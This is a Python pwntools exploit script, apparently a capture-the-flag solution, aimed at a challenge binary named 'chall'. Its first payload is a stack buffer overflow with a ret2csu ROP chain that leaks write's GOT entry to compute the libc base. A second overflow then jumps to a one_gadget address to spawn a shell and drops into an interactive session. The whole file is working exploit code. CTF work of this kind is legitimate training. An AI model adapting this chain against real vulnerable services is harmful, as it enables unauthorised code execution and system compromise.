#!/usr/bin/env python3
from pwn import *
BIN_FILE  = './chall'
LIBC_FILE = './libc.so.6'

HOST = args.HOST or 'localhost'
PORT = int(args.PORT or 1337)

context(os='linux', arch='amd64')
# context.terminal = ['tmux', 'splitw', '-h']
# context.log_level = 'debug'

binf = ELF(BIN_FILE)
libc = ELF(LIBC_FILE) if LIBC_FILE != '' else None

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug(BIN_FILE)
    else:
        return process(BIN_FILE)

def attack(io, **kwargs):
    exploit = p64(0x39)
    exploit += b'a' * 0x40
    exploit += p64(0x400a3a)
    exploit += p64(0)
    exploit += p64(1)
    exploit += p64(binf.got['write'])
    exploit += p64(1)
    exploit += p64(binf.got['write'])
    exploit += p64(16)
    exploit += p64(0x400a20)
    exploit += b'0' * 0x38
    exploit += p64(binf.sym.main)
    
    io.sendlineafter('> ', exploit)
    io.recvline()
    io.recvline()
    io.recvline()

    leak = unpack(io.recvuntil(b'\x00'), 'all')
    libc.address = leak - libc.sym.write
    info('libc_base = 0x{:08x}'.format(libc.address))

    onegad = [0x4f3d5, 0x4f432, 0x10a41c]
    addr_onegad = libc.address + onegad[0]

    io.sendlineafter('> ', p64(57) + b'a'*0x40 + p64(addr_onegad))

def main():
    io = start()
    attack(io)
    io.interactive()

if __name__ == '__main__':
    main()
